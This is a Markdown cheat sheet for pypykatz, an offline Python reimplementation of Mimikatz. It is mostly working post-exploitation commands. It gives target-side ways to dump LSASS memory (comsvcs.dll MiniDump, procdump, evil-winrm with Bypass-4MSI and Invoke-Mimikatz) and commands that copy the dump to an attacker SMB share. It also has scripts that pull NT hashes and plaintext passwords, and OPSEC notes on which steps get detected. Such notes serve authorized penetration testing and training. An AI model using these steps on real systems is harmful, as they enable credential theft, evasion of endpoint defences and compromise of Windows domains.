# pypykatz

**Tags:** `#pypykatz` `#mimikatz` `#credentialdumping` `#lsass` `#offline` `#linux` `#postexploitation`

Python implementation of Mimikatz — parses LSASS minidumps, registry hive files, and NTDS.dit entirely on Linux with no Windows dependency. The go-to tool when you've dumped LSASS from a target (via procdump, comsvcs.dll, Task Manager, etc.) and need to extract credentials on your Kali box without running Mimikatz on the target at all.

**Source:** https://github.com/skelsec/pypykatz
**Install:** `pip install pypykatz` or `sudo apt install python3-pypykatz`

```bash
# Parse a local LSASS minidump
pypykatz lsa minidump lsass.dmp
```

> [!note] **pypykatz vs Mimikatz** — pypykatz runs on Kali against an exfiltrated dump file — zero execution on the target beyond the initial dump. Mimikatz must run on the target. Use pypykatz when OPSEC matters or when you need to parse dumps offline/later.

---

## LSASS Minidump Parsing

```bash
# Parse LSASS dump — all credentials
pypykatz lsa minidump lsass.dmp

# Output as JSON
pypykatz lsa minidump lsass.dmp -o json > creds.json

# Output as grep-friendly text
pypykatz lsa minidump lsass.dmp -o text > creds.txt

# Verbose — show all packages including empty ones
pypykatz lsa minidump lsass.dmp -v

# Only show NThashes
pypykatz lsa minidump lsass.dmp | grep -A5 "== MSV =="

# Kerberos tickets from dump
pypykatz lsa minidump lsass.dmp | grep -A10 "== Kerberos =="
```

**Example output:**
```
== LogonSession ==
authentication_id: 123456
username: Administrator
domainname: INLANEFREIGHT
logon_type: Interactive

  == MSV ==
    Username: Administrator
    Domain: INLANEFREIGHT
    NT: fc525c9683e8fe067095ba2ddc971889
    LM: None

  == WDIGEST ==
    username: Administrator
    password: Password123!        # Only if WDigest enabled

  == Kerberos ==
    Username: Administrator
    Password: None
```

---

## Registry Hive Parsing

```bash
# Parse SAM + SYSTEM hives (local accounts)
pypykatz registry --sam sam.save --system system.save

# Parse SAM + SECURITY + SYSTEM (LSA secrets + cached creds)
pypykatz registry --sam sam.save --security security.save --system system.save

# Output as JSON
pypykatz registry --sam sam.save --system system.save -o json > hashes.json
```

---

## NTDS.dit Parsing

```bash
# Parse NTDS.dit + SYSTEM hive
pypykatz dpapi system --ntds ntds.dit --system SYSTEM

# Alternative — use secretsdump for NTDS parsing (more battle-tested)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

---

## Getting an LSASS Dump (Target-Side)

pypykatz is useless without a dump file. Common ways to get one:

```cmd
# Method 1: comsvcs.dll (LOLBin — no extra tools)
rundll32 C:\windows\system32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full

# Method 2: Task Manager — right-click lsass.exe → Create dump file (GUI)

# Method 3: ProcDump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp

# Method 4: via evil-winrm (direct dump command)
# In evil-winrm session:
Bypass-4MSI
Invoke-Mimikatz   # Or use the built-in lsass dump
```

```powershell
# PowerShell one-liner (comsvcs method)
$p = Get-Process lsass; rundll32 C:\windows\system32\comsvcs.dll MiniDump $p.Id C:\Temp\lsass.dmp full; Wait-Process -Id (Get-Process rundll32).id
```

```bash
# Exfil dump back to Kali
# From evil-winrm:
download C:\Windows\Temp\lsass.dmp ./lsass.dmp

# Via SMB server on Kali:
impacket-smbserver share $(pwd) -smb2support
# On target:
copy C:\Windows\Temp\lsass.dmp \\KALI-IP\share\lsass.dmp
```

---

## Parsing JSON Output

```bash
# Extract all NT hashes from JSON output
pypykatz lsa minidump lsass.dmp -o json | python3 -c "
import json, sys
data = json.load(sys.stdin)
seen = set()
for session in data.get('logon_sessions', {}).values():
    for msv in session.get('msv_creds', []):
        nt = msv.get('NThash')
        user = msv.get('username')
        domain = msv.get('domainname')
        if nt and nt not in seen:
            seen.add(nt)
            print(f'{domain}\\{user}:{nt}')
"

# Extract WDigest plaintext passwords
pypykatz lsa minidump lsass.dmp -o json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for session in data.get('logon_sessions', {}).values():
    for w in session.get('wdigest_creds', []):
        pw = w.get('password')
        user = w.get('username')
        if pw and pw != 'None':
            print(f'{user}:{pw}')
"
```

---

## OPSEC Notes

- pypykatz itself runs entirely on Kali — generates no Windows events
- The LSASS dump step is what gets detected — Event ID **10** in Sysmon (process access to lsass.exe) and **4656** (handle to LSASS)
- comsvcs.dll MiniDump is the most LOLBin-friendly dump method but still triggers EDR on LSASS handle acquisition
- Dump file contains raw credential material — handle carefully, encrypt at rest if storing

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
